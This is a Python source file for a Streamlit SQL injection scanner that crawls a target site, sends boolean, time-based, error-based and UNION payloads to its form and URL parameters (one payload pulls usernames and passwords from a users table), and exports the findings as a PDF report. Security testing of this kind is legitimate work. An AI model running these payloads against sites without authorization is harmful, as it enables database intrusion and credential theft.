import streamlit as st
import requests
import time
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from bs4 import BeautifulSoup
from collections import deque
from io import BytesIO
from dataclasses import dataclass, asdict

# PDF Export Configuration
try:
    from reportlab.lib.pagesizes import letter
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
    from reportlab.lib.styles import getSampleStyleSheet
    REPORTLAB_AVAILABLE = True
except ImportError:
    REPORTLAB_AVAILABLE = False

@dataclass
class Finding:
    input: str
    type: str
    payload: str
    proof: str
    url: str
    severity: str

class SQLiScannerPro:
    def __init__(self, target_url, timeout=10, max_pages=20, debug=True):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.max_pages = max_pages
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerable = False
        self.findings: list[Finding] = []
        self.logs = []
        self.debug = debug
        self.visited = set()
        self.queue = deque()

        self.payloads = {
            'boolean': [
                "' OR '1'='1' -- ",
                "' OR '1'='1' #",
                '" OR "1"="1" -- ',
                "admin' OR '1'='1"
            ],
            'time': [
                "' OR SLEEP(5)-- ",
                "'; WAITFOR DELAY '0:0:5'--",
                '" OR pg_sleep(5)--',
            ],
            'error': [
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                '" AND 1=CAST((SELECT version()) AS INT)--',
                "' AND (SELECT 1/0)--"
            ],
            'union': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT username, password FROM users--"
            ]
        }

    def log(self, message, level="DEBUG"):
        log_entry = f"[{level}] {message}"
        self.logs.append(log_entry)
        if self.debug or level != "DEBUG":
            print(log_entry)

    def normalize_url(self, url):
        parsed = urlparse(url)
        path = parsed.path.rstrip('/') or '/'
        return f"{parsed.scheme}://{parsed.netloc}{path}"

    def is_same_domain(self, url):
        return urlparse(url).netloc == urlparse(self.target_url).netloc

    def crawl(self, progress_callback=None):
        self.queue.append(self.target_url)
        self.visited.add(self.normalize_url(self.target_url))
        pages_discovered = 0

        while self.queue and pages_discovered < self.max_pages:
            current_url = self.queue.popleft()
            pages_discovered += 1

            if progress_callback:
                progress_callback(pages_discovered / self.max_pages)

            try:
                response = self.session.get(current_url, timeout=self.timeout)
                if response.status_code != 200:
                    continue

                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all(['a', 'link'], href=True):
                    url = urljoin(current_url, link['href'])
                    normalized = self.normalize_url(url)

                    if (self.is_same_domain(url)
                        and normalized not in self.visited
                        and not any(ext in url.lower() for ext in ['.jpg', '.png', '.css', '.js'])):
                        self.visited.add(normalized)
                        self.queue.append(url)

            except Exception as e:
                self.log(f"Crawl error at {current_url}: {str(e)}", "ERROR")

    def extract_inputs(self, url):
        inputs = []
        parsed = urlparse(url)
        get_params = list(parse_qs(parsed.query).keys())
        if get_params:
            inputs.append({'action': url, 'method': 'get', 'inputs': get_params})

        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')

            for form in soup.find_all('form'):
                action = form.get('action', url)
                method = form.get('method', 'get').lower()
                inputs_list = []
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    if input_tag.get('name') and input_tag.get('type') != 'submit':
                        inputs_list.append(input_tag.get('name'))
                if inputs_list:
                    inputs.append({
                        'action': urljoin(url, action),
                        'method': method,
                        'inputs': inputs_list
                    })
        except Exception as e:
            self.log(f"Form extraction error at {url}: {str(e)}", "ERROR")

        return inputs

    def response_hash(self, text):
        return hashlib.md5(text.encode('utf-8')).hexdigest()

    def build_test_url(self, action, field, payload, method):
        if method == 'get':
            parsed = urlparse(action)
            query = parse_qs(parsed.query)
            query[field] = payload
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(query, doseq=True)}"
        else:
            return f"POST {action} with {field}={payload}"

    def test_vulnerability(self, input_dict):
        action = input_dict['action']
        method = input_dict['method']

        try:
            original_response = self.session.get(action, timeout=self.timeout)
            original_hash = self.response_hash(original_response.text)
        except:
            return

        for field in input_dict['inputs']:
            for category, payloads in self.payloads.items():
                hit_count = 0
                for payload in payloads:
                    try:
                        data = {field: payload}
                        if method == 'get':
                            response = self.session.get(action, params=data, timeout=self.timeout)
                        else:
                            response = self.session.post(action, data=data, timeout=self.timeout)

                        if category == 'boolean':
                            if self.response_hash(response.text) != original_hash:
                                hit_count += 1

                        elif category == 'time':
                            start = time.time()
                            if method == 'get':
                                self.session.get(action, params=data, timeout=self.timeout)
                            else:
                                self.session.post(action, data=data, timeout=self.timeout)
                            elapsed = time.time() - start
                            if elapsed >= 5:
                                hit_count += 1

                        elif category == 'error':
                            if any(k in response.text.lower() for k in [
                                'sql','syntax','mysql','ora-','odbc','unclosed quotation','conversion failed']):
                                hit_count += 1

                        elif category == 'union':
                            if "union" in response.text.lower() or "select" in response.text.lower():
                                hit_count += 1

                        if hit_count >= 2:  # confirmation threshold
                            finding = Finding(
                                input=field,
                                type=category.capitalize() + "-based",
                                payload=payload,
                                proof=f"Confirmed {category} injection",
                                url=self.build_test_url(action, field, payload, method),
                                severity="High" if category in ["boolean","error","union"] else "Medium"
                            )
                            self.findings.append(asdict(finding))
                            self.vulnerable = True
                            self.log(f"{category.capitalize()} injection in {field}", "WARNING")
                            break
                    except Exception as e:
                        self.log(f"Test error for {field}: {str(e)}", "ERROR")

    def quick_scan(self):
        inputs = self.extract_inputs(self.target_url)
        for input_set in inputs:
            self.test_vulnerability(input_set)

    def deep_scan(self, progress_callback=None):
        self.crawl(progress_callback)
        for url in self.visited:
            inputs = self.extract_inputs(url)
            for input_set in inputs:
                self.test_vulnerability(input_set)


def generate_pdf_report(target, findings, logs):
    buffer = BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter)
    styles = getSampleStyleSheet()
    story = []

    story.append(Paragraph("SQL Injection Scan Report", styles["Title"]))
    story.append(Spacer(1, 12))
    story.append(Paragraph(f"<b>Target URL:</b> {target}", styles["Normal"]))
    story.append(Paragraph(f"<b>Scan Date:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}", styles["Normal"]))
    story.append(Spacer(1, 12))

    if findings:
        story.append(Paragraph("<b>Vulnerabilities Found:</b>", styles["Heading2"]))
        for f in findings:
            story.append(Paragraph(f"<b>Type:</b> {f['type']}", styles["Normal"]))
            story.append(Paragraph(f"<b>Input Field:</b> {f['input']}", styles["Normal"]))
            story.append(Paragraph(f"<b>Severity:</b> {f['severity']}", styles["Normal"]))
            story.append(Paragraph(f"<b>Payload:</b> {f['payload']}", styles["Normal"]))
            story.append(Paragraph(f"<b>Proof:</b> {f['proof']}", styles["Normal"]))
            story.append(Paragraph(f"<b>Example:</b> {f['url']}", styles["Normal"]))
            story.append(Spacer(1, 12))
    else:
        story.append(Paragraph("No vulnerabilities detected.", styles["Normal"]))

    if logs:
        story.append(Paragraph("<b>Scan Logs:</b>", styles["Heading2"]))
        for log in logs:
            story.append(Paragraph(log, styles["Code"]))

    doc.build(story)
    buffer.seek(0)
    return buffer
